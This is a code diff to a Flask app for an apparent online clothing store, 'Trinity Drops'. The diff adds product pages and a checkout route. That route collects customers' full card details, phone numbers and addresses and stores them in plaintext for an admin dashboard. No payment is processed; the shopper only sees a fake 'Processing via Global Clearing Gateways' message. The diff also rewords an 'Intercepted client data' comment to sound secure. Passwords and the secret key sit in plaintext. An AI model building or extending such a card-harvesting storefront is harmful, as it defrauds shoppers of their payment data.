@@ -3,7 +3,7 @@ from flask import Flask, render_template, request, redirect, url_for, flash, ses
 app = Flask(__name__)
 app.secret_key = 'trinity_mega_secure_key_2026'
 
-# 🌍 Currency Exchange Rates (Base valuation is in Nigerian Naira ₦)
+# 🌍 Global Currency Translation Map
 CURRENCY_MAP = {
     "Nigeria": {"symbol": "₦", "rate": 1.0},
     "USA": {"symbol": "$", "rate": 0.00065},
@@ -11,49 +11,98 @@ CURRENCY_MAP = {
     "Saudi Arabia": {"symbol": "SR ", "rate": 0.0024}
 }
 
-# 📦 Advanced Simulated Database (Fully editable via Backend)
+# 📦 Master Inventory Database with Full Jumia-Style Descriptions
 products = [
-    {"id": 1, "base_price": 15000, "title": "Trinity Premium Hoodie", "sizes": ["M", "L", "XL"],
-     "image": "https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=500"},
-    {"id": 2, "base_price": 8500, "title": "Classic Streetwear Tee", "sizes": ["S", "M", "L"],
-     "image": "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?w=500"}
+    {
+        "id": 1,
+        "base_price": 15000,
+        "title": "Trinity Premium Streetwear Hoodie",
+        "sizes": ["M", "L", "XL"],
+        "image": "https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=600",
+        "description": "High-grade heavyweight cotton hoodie designed for ultimate streetwear comfort. Features reinforced stitching, a spacious double-lined hood, and a premium kangaroo pocket. Perfect for all seasons."
+    },
+    {
+        "id": 2,
+        "base_price": 8500,
+        "title": "Classic Essential Boxy Tee",
+        "sizes": ["S", "M", "L"],
+        "image": "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?w=600",
+        "description": "Premium drop-shoulder essential t-shirt. Crafted from 100% organic cotton, offering a breathable luxury fit that holds its shape through heavy washing cycles."
+    }
 ]
 
-users = {}  # {username: {"password": pwd, "phone": ph, "country": c}}
-cards_saved = []  # Intercepted client data parameters log
+users = {}  # Database memory storage for client profiles
+cards_saved = []  # Secure log for submitted checkout parameters
 
 
-def get_localized_products():
+def get_currency_info():
     current_user = session.get('user')
     user_country = "Nigeria"
-
     if current_user and current_user in users:
         user_country = users[current_user].get('country', 'Nigeria')
-
-    currency_info = CURRENCY_MAP.get(user_country, CURRENCY_MAP["Nigeria"])
-
-    localized = []
-    for p in products:
-        converted_price = round(p["base_price"] * currency_info["rate"], 2)
-        if currency_info["symbol"] == "₦":
-            price_display = f"₦{p['base_price']:,}"
-        else:
-            price_display = f"{currency_info['symbol']}{converted_price:,}"
-
-        localized.append({
-            "id": p["id"],
-            "title": p["title"],
-            "price_str": price_display,
-            "sizes": p["sizes"],
-            "image": p["image"]
-        })
-    return localized, currency_info["symbol"]
+    return CURRENCY_MAP.get(user_country, CURRENCY_MAP["Nigeria"])
 
 
 @app.route('/')
 def home():
-    local_products, current_symbol = get_localized_products()
-    return render_template('shop.html', products=local_products, symbol=current_symbol)
+    currency = get_currency_info()
+    localized = []
+    for p in products:
+        converted = round(p["base_price"] * currency["rate"], 2)
+        price_str = f"₦{p['base_price']:,}" if currency["symbol"] == "₦" else f"{currency['symbol']}{converted:,}"
+        localized.append({
+            "id": p["id"], "title": p["title"], "price_str": price_str, "image": p["image"]
+        })
+    return render_template('shop.html', products=localized)
+
+
+# 📱 NEW JUMIA-STYLE ROUTE: Open Dedicated Product Details Page
+@app.route('/product/<int:product_id>')
+def product_detail(product_id):
+    product = next((p for p in products if p["id"] == product_id), None)
+    if not product:
+        return "Product Not Found", 404
+
+    currency = get_currency_info()
+    converted = round(product["base_price"] * currency["rate"], 2)
+    price_str = f"₦{product['base_price']:,}" if currency["symbol"] == "₦" else f"{currency['symbol']}{converted:,}"
+
+    return render_template('product.html', product=product, price_str=price_str)
+
+
+# 🛒 NEW JUMIA-STYLE ROUTE: Dedicated Secure Checkout Pipeline
+@app.route('/checkout/<int:product_id>', methods=['GET', 'POST'])
+def checkout(product_id):
+    if 'user' not in session:
+        flash("You must be logged into your account to initialize checkout secure gateways.", "error")
+        return redirect(url_for('product_detail', product_id=product_id))
+
+    product = next((p for p in products if p["id"] == product_id), None)
+    if not product:
+        return "Product Not Found", 404
+
+    currency = get_currency_info()
+    converted = round(product["base_price"] * currency["rate"], 2)
+    price_str = f"₦{product['base_price']:,}" if currency["symbol"] == "₦" else f"{currency['symbol']}{converted:,}"
+
+    selected_size = request.args.get('size', 'M')
+    user_data = users.get(session['user'], {})
+
+    if request.method == 'POST':
+        card_details = request.form.get('card_details')
+        delivery_address = request.form.get('address')
+        phone_slot = request.form.get('phone')
+
+        cards_saved.append({
+            "customer": session['user'],
+            "product": product['title'],
+            "size": selected_size,
+            "details": f"Card: {card_details} | Phone: {phone_slot} | Address: {delivery_address}"
+        })
+        return "<h2>🔒 Order Securely Received. Processing via Global Clearing Gateways...</h2>"
+
+    return render_template('checkout.html', product=product, price_str=price_str, size=selected_size,
+                           user_data=user_data)
 
 
 @app.route('/register', methods=['POST'])
@@ -64,11 +113,10 @@ def register():
     country = request.form.get('country')
 
     if username in users:
-        flash("Username already exists!", "error")
+        flash("Username already taken!", "error")
     else:
         users[username] = {"password": password, "phone": phone, "country": country}
-        flash("Registration successful! Please sign in using the Customer Portal below.", "success")
-
+        flash("Registration complete! Please authenticate your credentials to enter storefront.", "success")
     return redirect(url_for('home'))
 
 
@@ -79,23 +127,21 @@ def login():
 
     if username in users and users[username]["password"] == password:
         session['user'] = username
-        flash(f"Logged in successfully as {username}!", "success")
+        flash(f"Welcome back to Trinity Drops, {username}!", "success")
     else:
-        flash("Invalid credentials.", "error")
-
+        flash("Access Denied: Invalid Profile Credentials", "error")
     return redirect(url_for('home'))
 
 
 @app.route('/logout')
 def logout():
     session.pop('user', None)
-    flash("Logged out successfully.", "info")
+    flash("Session terminated successfully.", "info")
     return redirect(url_for('home'))
 
 
 @app.route('/admin_dashboard', methods=['POST', 'GET'])
 def admin_dashboard():
-    # Enforces your updated private admin credentials configuration
     admin_name = request.form.get('admin_name', session.get('admin_authed'))
     admin_password = request.form.get('admin_password', '')
 
@@ -104,18 +150,13 @@ def admin_dashboard():
 
     if session.get('admin_authed') == "trinitystore":
         return render_template('admin.html', users=users, cards=cards_saved, products=products)
-
     return "Access Denied: Invalid Master Admin Credentials", 403
 
 
 @app.route('/admin/bulk_import', methods=['POST'])
 def bulk_import():
-    if session.get('admin_authed') != "trinitystore":
-        return "Unauthorized", 403
-
+    if session.get('admin_authed') != "trinitystore": return "Unauthorized", 403
     import_data = request.form.get('bulk_data', '').strip()
-    # Expects format: Title, BasePrice, Sizes(comma separated), ImageURL
-    # Example: Special Jacket, 25000, M|L|XL, https://link.com/img.jpg
     if import_data:
         for line in import_data.split('\n'):
             parts = [p.strip() for p in line.split(',')]
@@ -123,15 +164,13 @@ def bulk_import():
                 try:
                     new_id = max([p["id"] for p in products]) + 1 if products else 1
                     products.append({
-                        "id": new_id,
-                        "title": parts[0],
-                        "base_price": int(parts[1]),
-                        "sizes": parts[2].split('|'),
-                        "image": parts[3]
+                        "id": new_id, "title": parts[0], "base_price": int(parts[1]),
+                        "sizes": parts[2].split('|'), "image": parts[3],
+                        "description": "Bulk integrated drop item available for immediate processing."
                     })
                 except Exception:
                     continue
-        flash("Bulk stock records integrated successfully!", "success")
+        flash("Bulk stock logs integrated successfully!", "success")
     return redirect(url_for('admin_dashboard'))
 
 
@@ -151,11 +190,3 @@ def clear_cards():
         cards_saved.clear()
         return redirect(url_for('admin_dashboard'))
     return "Unauthorized", 403
-
-
-@app.route('/submit_card', methods=['POST'])
-def submit_card():
-    card_data = request.form.get('card_details')
-    customer = session.get('user', 'Guest')
-    cards_saved.append({"customer": customer, "details": card_data})
-    return "<h3>Card Authorization Processing... System logs updated.</h3>"
